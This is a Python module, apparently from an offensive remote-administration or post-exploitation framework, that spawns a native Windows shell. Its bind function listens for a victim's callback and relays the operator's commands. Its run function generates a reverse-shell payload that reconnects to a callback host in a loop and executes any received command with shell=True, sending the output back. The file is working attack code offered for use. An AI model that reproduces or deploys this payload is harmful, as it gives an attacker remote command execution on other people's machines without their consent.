import socket
import threading
import os
import sys

from core.data import viewbag
from core.color import color


def module_classification():
    return 'admin/shell'


def module_description():
    return 'Spawn a native Windows shell.'


def bind(port):
    serv_add = (viewbag.CALLBACK_IP, port)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(serv_add)
    server.listen(5)
    c, addr = server.accept()
    print color.ReturnSuccess('Received callback from remote shell -> %s:%s\n' % (addr[0], str(addr[1])))
    firstshell = c.recv(1024)
    sys.stdout.write(firstshell)
    while True:
        cmd = raw_input(' ')
        if cmd == 'quit':
            c.send(cmd)
            c.close()
            server.close()
            break
        if len(cmd) > 0:
            c.send(cmd)
            client_response = c.recv(4096)
            sys.stdout.write(client_response)
    c.close()


def run(port):
    plugin = '''def run():
    import socket
    import os
    import subprocess
    import time
    target_host = "<cip>"
    target_port = %s
    while True:
        try:
            client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            client.connect((target_host,target_port))
            break
        except socket.error:
            time.sleep(2)
            pass
    client.send(str(os.getcwd()) + '$')
    while True:
        data = client.recv(1024)
        if data[:2] == 'cd':
            os.chdir(data[3:])
        elif data[:4] == 'quit':
            break
        if len(data) > 0:
            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
            output_bytes = cmd.stdout.read()
            client.send(output_bytes + str(os.getcwd()) + '$')
    client.close()
''' % port
    return plugin
